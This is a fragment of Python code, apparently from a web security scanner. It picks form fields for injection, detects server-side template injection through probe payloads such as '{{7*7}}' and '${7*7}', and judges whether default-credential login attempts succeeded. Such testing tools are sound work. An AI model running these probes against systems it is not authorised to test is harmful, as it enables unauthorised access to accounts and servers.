    candidates: list[str] = []
    for input_field in _list_of_dicts(form.get("inputs")):
        name = str(input_field.get("name") or "")
        input_type = str(input_field.get("type") or "text").lower()
        lowered = name.lower()
        if (
            not name
            or name not in fields
            or input_type in {"hidden", "password", "submit", "button", "checkbox", "radio"}
        ):
            continue
        if "csrf" in lowered or "token" in lowered or "email" in lowered:
            continue
        candidates.append(name)
    return sorted(candidates, key=_flow_payload_field_sort_key)


def _flow_payload_field_sort_key(name: str) -> tuple[int, str]:
    if "name" in name.lower():
        priority = 0
    else:
        priority = 1
    return priority, name


def _deferred_eval_signal(body: str, *, payload: str = "") -> dict[str, str]:
    if payload and payload in body:
        return {}
    text = re.sub(r"\s+", " ", body)
    expected = _deferred_expected_markers(payload)
    for marker in expected:
        if marker == "49":
            if re.search(r"(?<!\d)49(?!\d)", text):
                return {"kind": "evaluated_expression", "observed": marker}
            continue
        if marker and marker in text:
            return {"kind": "evaluated_expression", "observed": marker}
    return {}


def _deferred_expected_markers(payload: str) -> tuple[str, ...]:
    return {
        '{{ 7|add:"42" }}': ("49",),
        "{{7*7}}": ("49",),
        "{{7*'7'}}": ("7777777",),
        "${7*7}": ("49",),
        "<%= 7*7 %>": ("49",),
    }.get(payload, ())


def _auth_submission_succeeded(response: ProbeResponse) -> bool:
    if response.status in {200, 201}:
        text = response.body.lower()
        if _body_has_password_form(response.body) or _body_has_login_form(response.body):
            return False
        if recognize_proofs(response.body) or _auth_materials(response):
            return True
        return _contains_word(text, ("logout", "profile", "account", "welcome"))
    if response.status in {302, 303}:
        raw_location = str(response.headers.get("location") or "")
        if not raw_location and response.final_url != response.url:
            raw_location = response.final_url
        location = raw_location.lower()
        if not location:
            return _response_sets_cookie(response)
        if _location_looks_auth_step(location):
            return False
        if _location_looks_authenticated(location):
            return True
        return _response_sets_cookie(response)
    return False


def _response_sets_cookie(response: ProbeResponse) -> bool:
    for name in response.headers:
        if name.lower() == "set-cookie":
            return True
    return False


def _location_looks_authenticated(location: str) -> bool:
    for marker in ("dashboard", "profile", "account", "admin", "home", "orders", "transactions"):
        if marker in location:
            return True
    return False


def _location_looks_auth_step(location: str) -> bool:
    lowered = location.lower()
    auth_markers = (
        "/login",
        "/log-in",
        "/signin",
        "/sign-in",
        "/auth",
        "/session",
        "/oauth",
        "/sso",
        "login?",
        "signin?",
        "auth?",
    )
    if _location_contains_marker(lowered, auth_markers):
        return True
    password_gate_markers = (
        "/forgot-password",
        "/reset-password",
        "/password-reset",
        "/change-password",
        "/password/forgot",
        "/password/reset",
    )
    return _location_contains_marker(lowered, password_gate_markers)


def _location_contains_marker(location: str, markers: tuple[str, ...]) -> bool:
    for marker in markers:
        if marker in location:
            return True
    return False


__all__ = ["probe_auth_session", "probe_default_credentials"]
